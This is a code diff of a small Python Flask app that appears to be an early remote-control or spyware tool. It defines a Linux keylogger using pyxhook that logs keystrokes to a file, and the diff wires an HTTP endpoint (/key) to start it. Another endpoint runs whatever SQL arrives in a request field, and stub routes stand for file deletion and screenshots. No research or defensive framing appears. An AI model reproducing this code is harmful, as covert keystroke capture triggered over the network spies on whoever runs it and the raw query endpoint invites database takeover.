@@ -7,9 +7,6 @@ from flask import Flask
 from flask import request
 import sqlite3
 
-host = socket.gethostname() #
-port = 8080  # Specify the port to connect to
-
 mydb = sqlite3.connect("user.db")
 
 # Creating an instance of 'cursor' class
@@ -18,7 +15,7 @@ mydb = sqlite3.connect("user.db")
 cursor = mydb.cursor()
 app = Flask(__name__)
 
-def start_key_logger(time):
+def start_key_logger():
     # Python code for keylogger
     # to be used in linux
 
@@ -67,7 +64,6 @@ def start_key_logger(time):
         pyxhook.print_err(msg)
         with open(log_file, 'a') as f:
             f.write('\n{}'.format(msg))
-# start_key_logger(10)
 @app.route('/')
 def hello_world():
     return 'Hello world!'
@@ -78,15 +74,18 @@ def sql_file():
     cursor.execute(request.form.get('parameter'))
     result = cursor.fetchall()
     return result
-@app.post('/delete',)
+@app.post('/delete')
 # do the file deletion
 def delete_file():
     pass
 @app.post('/key')
 # do the keylog
 def keylogger():
-    pass
+    start_key_logger()
 @app.post('/shot')
 # do the screenshot
 def screenshot():
     pass
+
+if __name__ == '__main__':
+    app.run()
